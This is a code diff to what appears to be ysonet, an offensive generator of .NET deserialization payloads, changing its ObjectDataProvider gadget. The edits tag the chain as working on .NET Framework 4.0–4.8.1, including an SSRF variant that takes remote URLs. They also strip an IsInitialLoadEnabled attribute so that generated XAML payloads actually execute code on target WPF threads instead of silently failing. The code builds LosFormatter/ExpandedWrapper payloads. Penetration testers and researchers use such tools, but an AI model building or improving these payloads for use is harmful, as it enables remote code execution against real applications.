@@ -34,7 +34,9 @@ namespace ysonet.Generators
             return new GadgetFacetSet()
                 .WithKinds(PayloadKind.CodeExecution)
                 .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.Wpf,
-                    GadgetRequirement.NetFramework);
+                    GadgetRequirement.NetFramework)
+                // PresentationFramework 4.0.0.0 chain; fired on 4.8.1
+                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481));
         }
 
         private int variant_number = 1; // Default
@@ -74,7 +76,10 @@ namespace ysonet.Generators
                         .WithKinds(PayloadKind.Network, PayloadKind.NestedDeserialization)
                         .WithInputs(PayloadInput.RemoteUrl, PayloadInput.LocalFile, PayloadInput.UncPath)
                         .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.Wpf,
-                            GadgetRequirement.NetFramework)),
+                            GadgetRequirement.NetFramework)
+                        // An override replaces the whole set, so repeat the gadget's
+                        // versions. The xamlurl SSRF variant fired on 4.8.1 too.
+                        .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481))),
                 new GadgetVariant(4, "WorkflowDesigner wrapper (Xaml, STA)")
             };
         }
@@ -87,6 +92,23 @@ namespace ysonet.Generators
         public override List<string> Labels()
         {
             return new List<string> { GadgetTags.Independent };
+        }
+
+        // We set odp.IsInitialLoadEnabled = false before assigning ObjectInstance so
+        // that BUILDING the payload does not invoke the method inside ysonet itself.
+        // XamlWriter.Save then writes that property into the payload, where it is
+        // actively harmful: it suppresses the initial load, so a target that parses
+        // the XAML on a WPF/STA (dispatcher) thread never runs the method. Strip it
+        // from what we emit; the live object keeps the flag, so generation stays safe.
+        //
+        // The --minify path already discarded this attribute, which is why a minified
+        // payload fired while the plain one silently did nothing (no exception, no
+        // execution). PayloadsFireIntoTestSinks fires Xaml variant 1 in both states.
+        private static string DropInitialLoadSuppressor(string xaml)
+        {
+            if (string.IsNullOrEmpty(xaml))
+                return xaml;
+            return xaml.Replace(" IsInitialLoadEnabled=\"False\"", "");
         }
 
         public override object Generate(string formatter, InputArgs inputArgs)
@@ -136,7 +158,7 @@ namespace ysonet.Generators
                 else if (variant_number == 4)
                 {
                     inputArgs.IsSTAThread = true; // we need STAThreadAttribute here
-                    string bridge = SerializersHelper.Xaml_serialize(odp);
+                    string bridge = DropInitialLoadSuppressor(SerializersHelper.Xaml_serialize(odp));
 
                     if (inputArgs.Minify)
                     {
@@ -153,6 +175,9 @@ namespace ysonet.Generators
                     //payload = XamlWriter.Save(odp);
                     payload = SerializersHelper.Xaml_serialize(odp);
                 }
+
+                // Never ship the initial-load suppressor (see DropInitialLoadSuppressor).
+                payload = DropInitialLoadSuppressor(payload);
 
                 if (inputArgs.Minify)
                 {
@@ -345,8 +370,8 @@ namespace ysonet.Generators
 
                 if (variant_number == 2)
                 {
-                    IGenerator tcdGadget = new TypeConfuseDelegateGenerator();
-                    string losFormatterPayload = Encoding.UTF8.GetString((byte[])tcdGadget.GenerateWithNoTest("LosFormatter", inputArgs));
+                    string losFormatterPayload = Encoding.UTF8.GetString(
+                        (byte[])new TypeConfuseDelegateGenerator().GenerateInner("LosFormatter", inputArgs));
                     payload = $@"<?xml version=""1.0""?>
 <root type=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.LosFormatter, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
     <ExpandedWrapperOfLosFormatterObjectDataProvider xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" >
